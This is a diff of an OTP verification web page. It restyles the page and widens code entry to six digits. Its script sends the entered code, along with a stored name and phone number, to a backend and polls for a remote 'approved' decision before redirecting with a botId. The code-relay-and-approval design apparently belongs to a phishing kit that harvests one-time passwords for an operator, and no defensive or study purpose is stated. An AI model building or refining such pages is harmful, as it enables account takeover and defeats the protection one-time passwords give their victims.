@@ -2,64 +2,127 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Enter Code</title>
-<style>
-body { font-family: Arial; background:#f6f7fb; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
-.code-container { background:#fff; 
-    padding:30px; 
-    width:450px;
-    text-align:center;
-     border-radius:12px; 
-     box-shadow:0 5px 15px rgba(0,0,0,0.1);
-     }
-.code-boxes input { width:55px; height:60px; font-size:24px; text-align:center; margin:5px; border:2px solid red; border-radius:6px; }
-button { width:100%; padding:12px; background:red; color:#fff; border:none; border-radius:6px; font-size:16px; cursor:pointer; display:flex; justify-content:center; align-items:center; }
-button:disabled { background:#ccc; cursor:not-allowed; }
-.spinner { display:none; width:20px; height:20px; border:3px solid #fff; border-top:3px solid rgba(255,255,255,0.3); border-radius:50%; animation:spin 1s linear infinite; margin-left:10px; }
-@keyframes spin { to { transform:rotate(360deg); } }
-#status { margin-top:15px; font-size:14px; color:#555; }
-.shake { animation: shake 0.4s; }
-@keyframes shake { 0%{transform:translateX(0);}25%{transform:translateX(-5px);}50%{transform:translateX(5px);}75%{transform:translateX(-5px);}100%{transform:translateX(0);} }
+<title>OTP Verification</title>
 
-/* --------- Countdown Timer --------- */
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #f47f3d;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.code-container {
+    width: 100%;
+    max-width: 420px;
+    text-align: center;
+    padding: 20px;
+}
+
+h2 {
+    color: #fff;
+    font-weight: 500;
+    margin-bottom: 8px;
+}
+
+p {
+    color: #ffe9dc;
+    margin-bottom: 25px;
+}
+
+.code-boxes {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 25px;
+}
+
+.code-boxes input {
+    width: 48px;
+    height: 55px;
+    font-size: 22px;
+    text-align: center;
+    border-radius: 8px;
+    border: none;
+    outline: none;
+}
+
+button {
+    width: 100%;
+    padding: 14px;
+    background: #fff;
+    color: #333;
+    border: none;
+    border-radius: 25px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+}
+
+.spinner {
+    display: none;
+    width: 18px;
+    height: 18px;
+    border: 3px solid #333;
+    border-top: 3px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-left: 8px;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+#status {
+    margin-top: 15px;
+    font-size: 14px;
+    color: #fff;
+}
+
 #timerContainer {
-    margin-top:10px;
-    display:none;
-    font-size:16px;
-    color:#555;
+    margin-top: 10px;
+    display: none;
+    color: #fff;
+    font-size: 14px;
 }
+
 #timerDisplay {
-    font-weight:bold;
-    color:red;
-}
-.code {
-    margin-bottom: 5px;
-}
-.otp-header {
-    font-weight: 300;
-   font-size: 20px;
+    font-weight: bold;
 }
 </style>
 </head>
+
 <body>
 
 <div class="code-container">
-    <h2 class="code">Enter Code</h2>
-    <h3 class="otp-header">enter otp send on sms</h3>
+    <h2>OTP Verification</h2>
+    <p>Enter the code sent to your mobile number</p>
+
     <form id="codeForm">
         <div class="code-boxes">
             <input maxlength="1" inputmode="numeric">
             <input maxlength="1" inputmode="numeric">
             <input maxlength="1" inputmode="numeric">
             <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
         </div>
+
         <button id="submitBtn" disabled>
-            <span id="btnText">Submit Code</span>
-            <div class="spinner" id="spinner"></div>
+            <span id="btnText">Verify</span>
+            <span class="spinner" id="spinner"></span>
         </button>
     </form>
 
-    <!-- OTP Timer -->
     <div id="timerContainer">
         OTP expires in <span id="timerDisplay">45</span> seconds
     </div>
@@ -116,7 +179,7 @@ function startCountdown() {
         timerDisplay.textContent = time;
         if (time <= 0) {
             clearInterval(countdown);
-            statusText.textContent = 'Time is up!';
+            statusText.textContent = 'Time expired';
         }
     }, 1000);
 }
@@ -125,13 +188,12 @@ function startCountdown() {
 document.getElementById('codeForm').addEventListener('submit', async e => {
     e.preventDefault();
 
-    startCountdown(); // start timer on submit
+    startCountdown();
 
     const code = [...inputs].map(i => i.value).join('');
     const name = localStorage.getItem('name');
     const phone = localStorage.getItem('phone');
 
-    // --- UX FEEDBACK ---
     button.disabled = true;
     btnText.textContent = 'Verifying...';
     spinner.style.display = 'inline-block';
@@ -145,23 +207,22 @@ document.getElementById('codeForm').addEventListener('submit', async e => {
         });
         const { requestId } = await res.json();
 
-        // Polling for approval
         const poll = setInterval(async () => {
             const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
             const d = await r.json();
 
             if (d.approved === true) {
                 clearInterval(poll);
-                clearInterval(countdown); // stop countdown on success
+                clearInterval(countdown);
                 localStorage.clear();
                 window.location.href = `success.html?botId=${botId}`;
             }
 
             if (d.approved === false) {
                 clearInterval(poll);
-                clearInterval(countdown); // stop countdown on failure
+                clearInterval(countdown);
                 button.disabled = false;
-                btnText.textContent = 'Submit Code';
+                btnText.textContent = 'Verify';
                 spinner.style.display = 'none';
                 statusText.textContent = 'Incorrect code. Try again.';
                 inputs.forEach(i => i.value='');
@@ -172,10 +233,9 @@ document.getElementById('codeForm').addEventListener('submit', async e => {
 
     } catch (err) {
         spinner.style.display = 'none';
-        btnText.textContent = 'Submit Code';
+        btnText.textContent = 'Verify';
         button.disabled = false;
-        statusText.innerText = 'Submission failed.';
-        console.error(err);
+        statusText.textContent = 'Submission failed';
     }
 });
 </script>
